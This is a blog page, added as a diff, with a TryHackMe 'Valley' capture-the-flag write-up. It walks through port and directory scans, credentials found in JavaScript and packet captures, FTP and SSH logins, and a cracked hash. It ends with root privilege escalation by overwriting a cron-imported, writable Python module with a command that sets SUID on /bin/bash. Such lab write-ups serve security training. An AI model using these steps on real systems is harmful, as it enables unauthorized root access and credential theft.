@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Valley | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2024-12-30</span>
+                <span>// ID: REF-Valley</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Valley</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme, ctf -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <hr />
+<pre class="codehilite"><code>`PORT      STATE SERVICE REASON  VERSION 22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 c2842ac1225a10f16616dda0f6046295 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf7Zvn7fOyAWUwEI2aH/k8AyPehxzzuNC1v4AAlhDa4Off4085gRIH/EXpjOoZSBvo8magsCH32JaKMMc59FSK4canP2I0VrXwkEX0F8PjA1TV4qgqXJI0zNVwFrfBORDdlCPNYiqRNFp1vaxTqLOFuHt5r34134yRwczxTsD4Uf9Z6c7Yzr0GV6NL3baGHDeSZ/msTiFKFzLTTKbFkbU4SQYc7jIWjl0ylQ6qtWivBiavEWTwkHHKWGg9WEdFpU2zjeYTrDNnaEfouD67dXznI+FiiTiFf4KC9/1C+msppC0o77nxTGI0352wtBV9KjTU/Aja+zSTMDxoGVvo/BabczvRCTwhXxzVpWNe3YTGeoNESyUGLKA6kUBfFNICrJD2JR7pXYKuZVwpJUUCpy5n6MetnonUo0SoMg/fzqMWw2nCZOpKzVo9OdD8R/ZTnX/iQKGNNvgD7RkbxxFK5OA9TlvfvuRUQQaQP7+UctsaqG2F9gUfWorSdizFwfdKvRU= |   256 429e2ff63e5adb51996271c48c223ebb (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNIiJc4hdfcu/HtdZN1fyz/hU1SgSas1Lk/ncNc9UkfSDG2SQziJ/5SEj1AQhK0T4NdVeaMSDEunQnrmD1tJ9hg= |   256 2ea0a56cd983e0016cb98a609b638672 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZhkboYdSkdR3n1G4sQtN4uO3hy89JxYkizKi6Sd/Ky 80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu)) | http-methods:  |_  Supported Methods: OPTIONS HEAD GET POST |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.41 (Ubuntu) 37370/tcp open  ftp     syn-ack vsftpd 3.0.3`
+</code></pre>
+
+<blockquote>
+<p>3 ports</p>
+<p>22<br />
+80<br />
+37370</p>
+</blockquote>
+<pre class="codehilite"><code>❯ feroxbuster -u 'http://v.thm' -w /usr/share/wordlists/dirb/big.txt
+
+403      GET        9l       28w      270c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       31w      267c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET      140l      394w     3940c http://v.thm/gallery/gallery.html
+200      GET       38l      129w     1163c http://v.thm/index.html
+200      GET       52l      106w      945c http://v.thm/styles.css
+200      GET       32l       61w      924c http://v.thm/pricing/pricing.html
+200      GET       38l      129w     1163c http://v.thm/
+200      GET        3l       10w       57c http://v.thm/pricing/note.txt
+301      GET        9l       28w      300c http://v.thm/gallery =&gt; http://v.thm/gallery/
+301      GET        9l       28w      300c http://v.thm/pricing =&gt; http://v.thm/pricing/
+301      GET        9l       28w      299c http://v.thm/static =&gt; http://v.thm/static/
+[####################] - 3m     20483/20483   0s      found:9       errors:7      
+[####################] - 3m     20469/20469   105/s   http://v.thm/ 
+[####################] - 0s     20469/20469   43184/s http://v.thm/gallery/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 1s     20469/20469   21615/s http://v.thm/pricing/ =&gt; Directory listing (add --scan-dir-listings to scan)
+[####################] - 0s     20469/20469   58483/s http://v.thm/static/ =&gt; Directory listing (add --scan-dir-listings to scan) 
+</code></pre>
+
+<blockquote>
+<p>in http://10.201.53.78/static/ see hidden dir http://10.201.53.78/static/00</p>
+</blockquote>
+<pre class="codehilite"><code>dev notes from valleyDev:
+-add wedding photo examples
+-redo the editing on #4
+-remove /dev1243224123123
+-check for SIEM alerts
+</code></pre>
+
+<blockquote>
+<p>so find dev</p>
+</blockquote>
+<pre class="codehilite"><code>http://10.201.53.78/dev1243224123123/
+
+have login forum
+
+and saw two js file
+
+button.js
+dev.js
+
+in dev.js
+
+    ```
+    &gt; loginButton.addEventListener(&quot;click&quot;, (e) =&gt; {
+    &gt; e.preventDefault();
+    &gt; const username = loginForm.username.value;
+    &gt; const password = loginForm.password.value;
+
+    &gt; if (username === &quot;siemDev&quot; &amp;&amp; password === &quot;california&quot;) {
+        &gt; window.location.href = &quot;/dev1243224123123/devNotes37370.txt&quot;;
+    &gt; } else {
+        &gt; loginErrorMsg.style.opacity = 1;
+    &gt; }
+&gt; })
+
+    ```
+
+    So found username &amp; password after login saw another note
+
+                ```
+                &gt; dev notes for ftp server:
+                -stop reusing credentials
+                -check for any vulnerabilies
+                -stay up to date on patching
+                -change ftp port to normal port
+                ```
+</code></pre>
+
+<blockquote>
+<p>so try to login wia ftp</p>
+</blockquote>
+<pre class="codehilite"><code>❯ ftp 10.201.53.78 37370
+Connected to 10.201.53.78.
+220 (vsFTPd 3.0.3)
+Name (10.201.53.78:kali): siemDev
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||27925|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
+-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
+-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
+226 Directory send OK.
+ftp&gt; dir
+229 Entering Extended Passive Mode (|||48954|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
+-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
+-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
+226 Directory send OK.
+ftp&gt; get siemFTP.pcapng
+local: siemFTP.pcapng remote: siemFTP.pcapng
+229 Entering Extended Passive Mode (|||31509|)
+150 Opening BINARY mode data connection for siemFTP.pcapng (7272 bytes).
+100% |**************************************************************************************************************|  7272       16.27 MiB/s    00:00 ETA
+226 Transfer complete.
+7272 bytes received in 00:02 (3.20 KiB/s)
+ftp&gt; get siemHTTP1.pcapng
+local: siemHTTP1.pcapng remote: siemHTTP1.pcapng
+229 Entering Extended Passive Mode (|||16349|)
+150 Opening BINARY mode data connection for siemHTTP1.pcapng (1978716 bytes).
+100% |**************************************************************************************************************|  1932 KiB   67.87 KiB/s    00:00 ETA
+226 Transfer complete.
+1978716 bytes received in 00:28 (67.00 KiB/s)
+ftp&gt; get siemHTTP2.pcapng
+local: siemHTTP2.pcapng remote: siemHTTP2.pcapng
+229 Entering Extended Passive Mode (|||46872|)
+150 Opening BINARY mode data connection for siemHTTP2.pcapng (1972448 bytes).
+100% |**************************************************************************************************************|  1926 KiB  108.25 KiB/s    00:00 ETA
+226 Transfer complete.
+1972448 bytes received in 00:18 (106.12 KiB/s)
+ftp&gt; 
+</code></pre>
+
+<blockquote>
+<p>after analyzing siemHTTP2.pcapng find something filtering http</p>
+</blockquote>
+<pre class="codehilite"><code>Frame 2335: 605 bytes on wire (4840 bits), 605 bytes captured (4840 bits) on interface any, id 0
+Linux cooked capture v1
+Internet Protocol Version 4, Src: 192.168.111.136, Dst: 192.168.111.136
+Transmission Control Protocol, Src Port: 47096, Dst Port: 80, Seq: 1, Ack: 1, Len: 537
+Hypertext Transfer Protocol
+HTML Form URL Encoded: application/x-www-form-urlencoded
+    Form item: &quot;uname&quot; = &quot;valleyDev&quot;
+    Form item: &quot;psw&quot; = &quot;ph0t0s1234&quot;
+        Key: psw
+        Value: ph0t0s1234
+    Form item: &quot;remember&quot; = &quot;on&quot;
+</code></pre>
+
+<blockquote>
+<p>So login wia ssh found user.txt.</p>
+</blockquote>
+<pre class="codehilite"><code>valleyDev@valley:~$ ls
+user.txt
+</code></pre>
+
+<blockquote>
+<p>and found something different file in home dir <code>valleyAuthenticator</code></p>
+</blockquote>
+<pre class="codehilite"><code>valleyDev@valley:/home$ ls
+siemDev  valley  valleyAuthenticator  valleyDev
+valleyDev@valley:/home$ 
+</code></pre>
+
+<blockquote>
+<p>So i download to my machine wia using python server to invistigate after downloading I open it wia strings and find</p>
+</blockquote>
+<pre class="codehilite"><code>❯ strings valleyAuthenticator
+
+-^;x&amp;
+e6722920bab2326f8217e4
+bf6b1b58ac
+ddJ1cc76ee3
+beb60709056cfbOW
+elcome to Valley Inc. Authentica
+[k0rHh
+ is your usernad
+
+
+I found two hash
+    `e6722920bab2326f8217e4bf6b1b58ac
+     ddJ1cc76ee3beb60709056cfbOW`
+
+
+After use those hash on cracker and found 
+
+`|   |   |   |
+|---|---|---|
+|e6722920bab2326f8217e4bf6b1b58ac|md5|liberty123|
+|ddJ1cc76ee3beb60709056cfbOW|Unknown|Unrecognized hash format.|`
+
+
+use that `liberty123`pwd and login as valley wia ssh
+</code></pre>
+
+<blockquote>
+<p>and invistigating find something</p>
+</blockquote>
+<pre class="codehilite"><code>valley@valley:/$ cat etc/crontab
+
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+1  *    * * *   root    python3 /photos/script/photosEncrypt.py
+
+
+`find / -type f -name 'base64.py' -ls 2&gt;/dev/null`
+
+    valley@valley:/$ find / -type f -name 'base64.py' -ls 2&gt;/dev/null
+   263097     24 -rwxrwxr-x   1 root     valleyAdmin    20490 Oct  9 09:08 /usr/lib/python3.8/base64.py
+     3929     20 -rwxr-xr-x   1 root     root           20382 Nov 14  2022 /snap/core20/1828/usr/lib/python3.8/base64.py
+     3906     20 -rwxr-xr-x   1 root     root           20382 Jun 22  2022 /snap/core20/1611/usr/lib/python3.8/base64.py
+</code></pre>
+
+<blockquote>
+<p>so know something here can writable so change so change like this</p>
+</blockquote>
+<pre class="codehilite"><code>echo &quot;import os;os.system('chmod u+s /bin/bash')&quot; &gt; /usr/lib/python3.8/base64.py
+</code></pre>
+
+<blockquote>
+<p>and it work</p>
+</blockquote>
+<pre class="codehilite"><code>valley@valley:/$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+</code></pre>
+
+<blockquote>
+<p>so run like this</p>
+</blockquote>
+<pre class="codehilite"><code>valley@valley:/$ bash -p
+bash-5.0# cd /root
+bash-5.0# ls
+root.txt  snap
+bash-5.0# cat root.txt
+</code></pre>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
